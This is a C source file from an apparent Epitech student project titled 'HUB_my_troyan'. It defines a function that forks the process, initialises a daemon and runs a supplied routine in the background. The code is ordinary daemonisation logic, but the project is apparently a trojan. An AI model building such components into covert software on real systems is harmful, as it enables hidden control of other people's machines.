/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 18/04/2021 daemon_start.c
*/

#include "client.h"

int daemon_start(core_func function)
{
    pid_t pid;

    pid = fork();
    if (pid == -1) {
        return EXIT_FAILURE;
    }
    if (pid != 0) {
        printf("Daemon PID: %d\n", pid);
        return EXIT_SUCCESS;
    } else {
        if (daemon_init() != EXIT_SUCCESS)
            return EXIT_FAILURE;
        return function();
    }
}